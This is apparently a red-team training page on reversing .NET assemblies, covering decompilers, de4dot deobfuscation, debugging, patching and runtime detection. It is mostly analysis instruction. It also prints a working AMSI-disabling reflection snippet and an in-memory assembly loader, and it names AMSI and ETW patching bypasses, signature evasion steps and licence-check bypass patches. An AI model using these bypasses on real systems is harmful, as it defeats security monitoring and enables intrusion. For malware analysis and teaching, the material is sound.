---
layout: training-page
title: ".NET Reverse Engineering — Red Team Academy"
module: "Reverse Engineering"
tags:
  - dotnet
  - csharp
  - dnSpy
  - ILSpy
  - de4dot
  - obfuscation
page_key: "re-dotnet-reversing"
render_with_liquid: false
---

# .NET Reverse Engineering

.NET is the dominant ecosystem for modern Windows red team tooling — SharpHound, Rubeus, Seatbelt, the entire GhostPack suite, and countless Cobalt Strike BOFs and execute-assembly payloads ship as managed assemblies. It is also a recurring malware class: stealers, loaders, and commodity RATs are written in C# because the runtime ships pre-installed on every Windows host and the build pipeline is trivial.

Reversing managed code is not the same job as reversing native x64. The compiler emits Common Intermediate Language (CIL), not x86, and modern decompilers reconstruct source-quality C# directly from the assembly metadata. The fight is no longer "what does this instruction do" — it is "what did the obfuscator do to the metadata, and how do I undo it." This page walks the toolchain, the workflow, and the obfuscation families you will see in practice.

Related pages: [RE Workflow & Tool Selection](/reverse-engineering/overview/) · [Static RE with Ghidra](/reverse-engineering/ghidra-static-re/) · [PE Format Deep Dive](/reverse-engineering/pe-format/) · [Malware Behavioral Patterns](/reverse-engineering/malware-patterns/)

---

## .NET Stack Refresher

Before touching a decompiler, you need the runtime model in your head — every reversing decision comes back to it.

```
SOURCE (C#, F#, VB.NET)
   │  csc / Roslyn
   ▼
CIL (Common Intermediate Language) — stack-based bytecode
   │  packaged inside a managed PE: CLR header (cor20), metadata tables, IL stream
   ▼
ASSEMBLY (.exe or .dll) — self-describing: every type, method, field is in metadata
   │  loaded by:
   ▼
CLR (Common Language Runtime)
   ├── .NET Framework 2.0–4.8        (mscoree.dll, mscorlib.dll, GAC, Windows-only)
   └── .NET Core / 5 / 6 / 7 / 8 / 9 (coreclr.dll, System.Private.CoreLib, single-file deploy)
   │  JIT compiles IL → native x86/x64 at first call (or AOT compiles ahead of time)
   ▼
NATIVE CODE in process
```

Key facts that drive reversing:

- **Metadata is the gold.** Unlike a stripped C++ binary, a default .NET assembly carries full type names, method names, parameter names, and even local variable names. The decompiler is reading that metadata, not guessing.
- **Reflection is first-class.** `Assembly.Load(byte[])`, `Type.GetType(string)`, `MethodInfo.Invoke()` mean code can be assembled and called from a string or a buffer at runtime. Any serious malware uses this.
- **Framework vs Core matters.** Framework binaries link `mscorlib` and assume a system-installed CLR. Core/5+ ships as a self-contained single-file `.exe` with the runtime bundled — the real assembly is wrapped inside an `AppHost` PE that your tools must unpack first.
- **AOT (NativeAOT, Ready2Run) breaks decompilers.** If dnSpy shows you nothing useful, check whether the binary was compiled AOT. There is no IL left.

---

## Toolchain

```
DECOMPILERS
  dnSpyEx          github.com/dnSpyEx/dnSpy        — decompiler + debugger + editor (THE primary tool)
  ILSpy            github.com/icsharpcode/ILSpy    — faster on large assemblies, CLI available
  dotPeek          jetbrains.com/decompiler        — good for navigating large solutions

DEOBFUSCATORS
  de4dot           github.com/de4dot/de4dot        — handles ~20 commercial obfuscators
  de4dot-cex       github.com/CodeStrikers/de4dot  — community fork with newer ConfuserEx support
  NETReactorSlayer github.com/SychicBoy/NETReactorSlayer — .NET Reactor specifically
  oldrod           github.com/Washi1337/OldRod     — KoiVM virtualization devirtualizer

MANIPULATION + PATCHING + RUNTIME
  dnlib            github.com/0xd4d/dnlib          — read/write .NET assemblies; dnSpy is built on this
  Mono.Cecil       github.com/jbevain/cecil        — older, simpler API; still widely used
  Reflexil         reflexil.net                    — dnSpy plugin; inline IL editing
  dnSpy debugger   built-in                        — attach managed process, set IL breakpoints
  SilkETW          github.com/mandiant/SilkETW     — capture Microsoft-Windows-DotNETRuntime events
```

dnSpyEx is the default. Reach for ILSpy only when dnSpy is slow on a 50MB merged assembly, and for dotPeek when you need solution-wide navigation.

---

## First-Look Workflow

The goal of the first ten minutes is to answer four questions: is it .NET, what runtime, is it obfuscated, and where is the interesting code.

### 1. Confirm it is .NET

```
file sample.exe                       → "PE32 executable ... Mono/.Net assembly"
Detect It Easy (DiE) sample.exe       → identifies .NET version + obfuscator signature
PE-bear / CFF Explorer                → check CLR Runtime Header in Optional Header data dirs
```

The authoritative check is the **CLR Runtime Header** (data directory index 14, `IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR`). If it is non-zero, the PE is managed. Native imports will be minimal — typically only `mscoree.dll!_CorExeMain` for Framework binaries, or nothing for Core single-file `.exe` (which is a native AppHost shim).

### 2. Identify the runtime

```
dnSpy → Properties      .NETFramework,Version=v4.8    → Framework
                        .NETCoreApp,Version=v8.0      → Core / .NET 8
References → mscorlib                                  → Framework
References → System.Private.CoreLib                    → Core / 5+
```

If the file is a native PE but you suspect .NET inside, rename `.exe` to `.zip` — recent single-file Core publishes are extractable as ZIPs. Otherwise use `single-file-extractor` to pull the inner assembly from the AppHost wrapper.

### 3. Detect obfuscation

```
de4dot -d sample.exe
# Detected ConfuserEx (1.0.0) / .NET Reactor (6.x) / SmartAssembly / Eziriz / Babel / unknown

# Heuristic signs if de4dot fails:
#   - All class/method names are <Module>, a, b, c, A, B, C, or Unicode squares
#   - Strings appear as Convert.FromBase64String + Aes.Decrypt at method entry
#   - Methods have a switch-on-counter dispatcher with hundreds of cases (CFF)
#   - Native module sections (.netrtl, .nrtl) → mixed-mode obfuscation
```

### 4. Strings and embedded resources

```
strings -n 8 sample.exe | grep -iE 'http|\.exe|\\\\|HKEY|select |insert |bot|c2|cmd'

dnSpy → Resources node                       → embedded files, often payloads
dnSpy → right-click resource → Save          → dump for separate analysis
```

Embedded `.resources` blobs containing encrypted PE bytes are the classic .NET loader pattern — pull them, decrypt them, then analyze the inner assembly as its own job.

---

## Decompiler Workflow

```
F12                — Go to definition (jump to called method)
Ctrl+Shift+R       — Analyze (find all references to symbol)
Ctrl+F / Ctrl+Shift+K  — Search within / across all loaded assemblies
Ctrl+T             — Go to type by name
Alt+Left/Right     — Navigate back / forward
Right-click → Analyze → "Used By" + "Uses"  — caller/callee tree
```

Two non-negotiable habits:

- **Open the entry point first.** Right-click assembly → Go to Entry Point. Read `Main()`. Most loaders are 30 lines: read a resource, decrypt it, `Assembly.Load(byte[])`, `Invoke()` an entry method. Find that pattern before anything else.
- **Watch the decompiler tab title.** dnSpy shows a `*` when decompilation is approximate — a sign of either obfuscation breaking the decompiler, or unsafe / pointer-heavy code that does not lift cleanly. Drop to the IL view for those methods. The view dropdown offers C# / IL / IL with C# comments / VB; IL is ground truth, C# is reconstruction.

### Renaming and exporting

de4dot renames symbols to deterministic placeholders (`Class1`, `method_2`, `field_15`). Walk the call graph from `Main` and rename as you understand. `Ctrl+R` on any identifier renames it everywhere in the assembly.

```
File → Export to Project
  → Generates a buildable .csproj with all decompiled source files
  → Open in Visual Studio / Rider for solution-wide refactoring + search
```

This is the highest-leverage move for a multi-thousand-line target. IDE-grade Find All References beats dnSpy's UI once the assembly is large.

---

## Common Obfuscation Classes

| Class | What it does | Tooling | Manual fallback |
|-------|--------------|---------|-----------------|
| **Symbol renaming** | Types/methods/fields renamed to `a`, `b`, Unicode glyphs, invalid identifiers | de4dot `--keep-names` | Rename incrementally in dnSpy |
| **String encryption** | Literals replaced with `Decrypt("base64...")` call at method entry | de4dot `--strtyp`, `--strtok`, `--strdec` | Reflexil → invoke decrypt method dynamically → dump |
| **Control-flow flattening** | Method body becomes a `while (true) switch (state)` dispatcher | de4dot handles most ConfuserEx CFF | Reconstruct by tracing state transitions in IL |
| **Resource encryption** | Embedded resources encrypted, decrypted on first access | de4dot for known obfuscators | Find decrypt routine, dump from memory under debugger |
| **Assembly merging** | All dependencies merged into one PE (ILMerge, Costura.Fody) | `costura-extractor` | dnSpy: merged DLLs as `costura.*.dll.compressed` |
| **Native stub launcher** | Native PE wraps .NET payload, decrypts via CLR hosting API | None automated | x64dbg → break on `ICLRRuntimeHost::ExecuteInDefaultAppDomain` → dump |
| **Virtualization (KoiVM)** | IL replaced with custom bytecode interpreted by embedded VM | `oldrod` | Manual: reverse VM dispatch loop, identify handlers |

### Obfuscator signatures

```
ConfuserEx       — module attribute "ConfusedByAttribute"; type names "ConfusedBy..."
.NET Reactor     — "PowerCrypt" string in resources; mixed-mode native sections
SmartAssembly    — types under {smartassembly} namespace; PDB-stripped metadata
Eziriz           — encrypted resource named after the assembly
Babel.NET        — types named "BabelObfuscator" stub remnants
Dotfuscator      — "DotfuscatorAttribute" on the module
```

---

## de4dot Workflow

```
de4dot -d sample.exe                         # 1. Detect (read-only)
de4dot sample.exe                            # 2. Standard cleanup → sample-cleaned.exe
de4dot -p crx sample.exe                     # 3. Force ConfuserEx when auto-detect picks wrong
de4dot --un-name '!^[a-z]' sample.exe        #    keep names not starting lowercase
de4dot --strtok 0x06000123 sample.exe        # 4. Invoke explicit decryptor method token
de4dot --keep-types --dont-rename sample.exe # 5. Aggressive: do NOT rename
```

After de4dot: open `sample-cleaned.exe` in dnSpy. If `Main()` is readable, deobfuscation is done. Otherwise use "Remove Unused Members" or a `dnlib` script to strip junk methods. Re-save — you now have a working artifact for both reading and patching.

---

## Dynamic Analysis (dnSpy Debugger)

dnSpy is a **managed debugger** — it sets breakpoints on IL offsets, inspects managed objects with type information, and supports edit-and-continue. Qualitatively different from x64dbg, which sees only the JITted native code.

```
Debug → Start (F5)            — launch the assembly under the debugger
Debug → Attach to Process     — managed PID list

F9 on any C# line             — IL breakpoint (real, not source-level emulation)
F10/F11/Shift+F11             — step over / in / out
Locals                        — full object inspection with managed field names
Modules                       — every loaded assembly + AppDomain
```

Runtime workflow: break just before the string decryption call → step over → copy cleartext from Locals → right-click method → Edit Method → replace the call with the literal → compile (F6) → patched in memory. Edit-and-continue also lets you skip anti-VM gates by patching the conditional to `return false`. See **Patching** below for saving the result to disk.

---

## .NET-Specific Malware Patterns

### In-memory assembly loading

```csharp
byte[] payload = File.ReadAllBytes("stage2.bin");                 // or HTTP, or resource extract
payload = Decrypt(payload, key);                                  // AES, XOR, RC4
Assembly asm = Assembly.Load(payload);                            // never touches disk
Type entryType = asm.GetType("Stage2.Loader");
MethodInfo entry = entryType.GetMethod("Run");
entry.Invoke(null, new object[] { c2Config });                    // execute
```

The canonical Cobalt Strike `execute-assembly` flow and the heart of almost every .NET loader. AMSI sees `Assembly.Load(byte[])` via `AmsiScanBuffer` integration in .NET 4.8+ (Framework) and .NET 5+ (Core). Bypass is typically reflective AMSI patching before the load call.

### Reflection-based dispatch

```csharp
Type t = Type.GetType("System.Diagnostics.Process, System");
MethodInfo m = t.GetMethod("Start", new[] { typeof(string), typeof(string) });
m.Invoke(null, new object[] { "cmd.exe", "/c whoami" });
```

`Process.Start` never appears as an import or string literal — it's assembled from concatenated obfuscated strings. ETW `Microsoft-Windows-DotNETRuntime` Method JIT events still show `System.Diagnostics.Process.Start` being JITted.

### AMSI provider unloading

```csharp
var t = typeof(System.Management.Automation.PSObject).Assembly
        .GetType("System.Management.Automation.AmsiUtils");
var f = t.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
f.SetValue(null, true);   // PowerShell host now treats AMSI as broken; scans skipped
```

PowerShell variant. The C# equivalent is `AmsiScanBuffer` patching via `VirtualProtect` + opcode overwrite — present in every offensive C# loader you will reverse.

### Three-stage loader

```
STAGE 1 (dropper):    small, signed-looking, downloads stage 2 over HTTPS
STAGE 2 (loader):     decrypts and reflectively loads stage 3 from memory
STAGE 3 (payload):    the actual implant — Cobalt Strike beacon, stealer, RAT
```

For each stage: identify decryption routine and key, dump the next stage, then move analysis to the dumped artifact. Stage 1 is usually boring — skip ahead.

---

## Red Team Tooling RE

Reading red team tooling source is the fastest way to internalize what defenders are looking for. The GhostPack assemblies are written to be read.

| Tool | Repo | What to study |
|------|------|---------------|
| **SharpHound** | `github.com/SpecterOps/SharpHound` | LDAP/SAMR/LSARPC enumeration mapped to Win32 APIs |
| **Rubeus** | `github.com/GhostPack/Rubeus` | Raw Kerberos — TGT/TGS forge, S4U2Self/Proxy, Pass-the-Ticket |
| **Seatbelt** | `github.com/GhostPack/Seatbelt` | Host triage — registry, WMI, .NET event log queries |
| **Certify** | `github.com/GhostPack/Certify` | ADCS abuse; cert template enumeration + DCOM enrollment |
| **SharpUp** | `github.com/GhostPack/SharpUp` | Local privesc — service ACLs, AlwaysInstallElevated |

Cobalt Strike `execute-assembly` flow: BOF marshals .NET assembly bytes to the implant → implant calls `ICorRuntimeHost::Start` (or hosts CoreCLR for .NET 5+) → loads into a transient AppDomain → invokes `Main` with supplied args → captures stdout via redirected `TextWriter` → AppDomain unloaded after return. The whole thing runs in the implant's process — no child process to spot.

---

## Patching

```
Reflexil (dnSpy plugin):
  Right-click method → Reflexil → Method body → Edit
  Add / replace IL directly (push, call, ret, brfalse, ...)
  Save → assembly re-emitted with modified IL stream

dnSpy native editor:
  Right-click method → Edit Method (C#) or Edit IL Instructions
  Write replacement → compile → File → Save Module
```

Common patches: bypass licensing / VM checks (`return true;`), strip telemetry (replace HTTP callback body with `return;`), inject logging (`Console.WriteLine` at entry/exit).

Patched assemblies fail Authenticode signature checks. If the original was strong-name-signed, the patched version loses the signature — code that loads only strong-named assemblies will reject it. Use `sn -Vr *,publickeytoken` on the test box to disable strong-name verification, or re-sign with a self-generated key and patch all references to the original public key token.

---

## Detection Side

```
AMSI (.NET 4.8+ Framework, .NET 5+ Core):
  Assembly.Load(byte[])  → AmsiScanBuffer called on assembly bytes
  Reflection.Emit        → AmsiScanBuffer called on emitted IL
  Bypass: patch AmsiScanBuffer to return AMSI_RESULT_CLEAN, or unload provider

ETW provider: Microsoft-Windows-DotNETRuntime
  AssemblyLoad           — every Assembly.Load (memory + disk)
  ModuleLoad
  MethodJittingStarted   — method name + signature visible BEFORE execution
  AppDomainCreate
  Capture: SilkETW / PerfView / ETW-stream-via-WMI
  Bypass: ETW patching via VirtualProtect on EtwEventWrite
```

Common detection rules:

- Sysmon Event 7 (Image Load) for `clr.dll` / `coreclr.dll` in a process that should not host CLR.
- ETW `MethodJittingStarted` where method name matches known offensive signature (`SharpHound.*`, `Rubeus.*`).
- ETW `AssemblyLoad` with empty file path → in-memory load → `execute-assembly` indicator.
- Defender / MDE: AMSI buffer scan happens before `Assembly.Load` returns — well-known offensive assemblies match on hash even when re-encrypted at the loader stage.

Red team evasion: rename types and methods (recompile from source), strip strong name, remove identifying assembly attributes, run through ConfuserEx to break AMSI/AV signatures.

---

## Workflow Summary

```
TRIAGE (10 min)
  file / DiE → confirm .NET, identify Framework vs Core, runtime version
  de4dot -d → identify obfuscator family
  dnSpy → entry point, read Main(), spot loader vs full implant
  strings + Resources node → C2 indicators, embedded payloads

DEOBFUSCATE + ANALYZE
  de4dot sample.exe → cleaned assembly; manual cleanup with Reflexil/dnSpy
  Export to Project for large targets
  Walk call graph from Main, renaming as you understand
  For reflection chains: trace string-to-method resolution

DUMP + RECURSE
  Extract embedded resources (encrypted payloads, merged DLLs)
  Decrypt → re-analyze each dropped stage as its own assembly
  For execute-assembly callers: dump the loaded byte[] from the debugger

DYNAMIC + PATCH
  dnSpy debugger → break before decryption, dump cleartext
  Reflexil → patch out anti-analysis gates, re-save
  Cross-reference behavior to ETW / AMSI signals defenders capture
```

---

## Resources

- dnSpyEx — `github.com/dnSpyEx/dnSpy`
- ILSpy — `github.com/icsharpcode/ILSpy`
- de4dot — `github.com/de4dot/de4dot`
- de4dot community fork (newer ConfuserEx) — `github.com/CodeStrikers/de4dot`
- NETReactorSlayer — `github.com/SychicBoy/NETReactorSlayer`
- OldRod (KoiVM devirtualizer) — `github.com/Washi1337/OldRod`
- dnlib — `github.com/0xd4d/dnlib`
- Mono.Cecil — `github.com/jbevain/cecil`
- GhostPack offensive .NET suite — `github.com/GhostPack`
- SharpHound — `github.com/SpecterOps/SharpHound`
- Microsoft .NET runtime docs — `learn.microsoft.com/en-us/dotnet/standard/`
- WithSecure Labs .NET malware analysis series — `labs.withsecure.com/publications`
- SilkETW (ETW capture) — `github.com/mandiant/SilkETW`
- Reflexil — `reflexil.net`
